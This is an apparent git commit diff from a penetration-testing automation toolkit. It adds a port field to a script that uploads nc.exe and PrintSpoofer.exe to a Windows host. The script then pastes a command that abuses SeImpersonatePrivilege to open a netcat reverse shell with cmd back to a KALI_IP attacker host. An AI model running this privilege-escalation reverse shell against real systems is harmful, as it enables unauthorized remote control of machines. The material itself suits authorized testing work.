7ef3c10dd0aaf24d4592abf467d8d4e4a96c8133
Danny van der Knaap <dvdknaap@users.noreply.github.com>
2025-03-27 08:58:56 -0400

    feat(bash): get custom dynamic fields (#62)

---
+++ code/xdotool/helpers/generate_gui_dynamic_field_value_form.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+
+generate_gui_dynamic_field_value_form_script="${HELPERS_DIR}/generate_gui_dynamic_field_value_form.py"
--- code/xdotool/scripts/windows/permissions/seImpersonatePrivilege/cmd_seImpersonatePrivilege.sh
+++ code/xdotool/scripts/windows/permissions/seImpersonatePrivilege/cmd_seImpersonatePrivilege.sh
@@ -8,25 +8,29 @@ CMD: PrintSpoofer: Reverse shell to KALI_IP:443 using SeImpersonatePrivilege.
 
 # Generate GUI form items (label, type (optional: default text), name, default (optional))
 SHELL_PORT_FIELD=$(form_item  "shell port" "number" "shell_port" "1337")
+PYTHON_HTTP_PORT_FIELD=$(form_item "Python HTTP port" "number" "python_http_port" "1234")
 
 # Generate GUI form
-generate_form "${SHELL_PORT_FIELD}"
+generate_form "${SHELL_PORT_FIELD}" "${PYTHON_HTTP_PORT_FIELD}"
 
 SHELL_PORT=${form_data["shell_port"]}
+PYTHON_HTTP_PORT=${form_data["python_http_port"]}
+
+ACTIVE_CRED_SYSTEM["python_http_port"]="${PYTHON_HTTP_PORT}"
 
 LOCATION="${SCRIPTS_DIR}/fileTransfer/windows/.binaries"
 FILE="nc.exe"
 
 cmd_upload_file "${LOCATION}" "${FILE}"
 NC_FILE_LOCATION="${FILE_LOCATION}"
-kill "${HTTP_PID}"
+sleep 3
 
 LOCATION="${SCRIPTS_DIR}/fileTransfer/windows/.binaries"
 FILE="PrintSpoofer.exe"
 
 cmd_upload_file "${LOCATION}" "${FILE}"
 PRINTSPOOFER_FILE_LOCATION="${FILE_LOCATION}"
-kill "${HTTP_PID}"
+sleep 3
 
 paste_command "${PRINTSPOOFER_FILE_LOCATION} -c \"${NC_FILE_LOCATION} ${KALI_IP} ${SHELL_PORT} -e cmd\""
 xdotool key Return
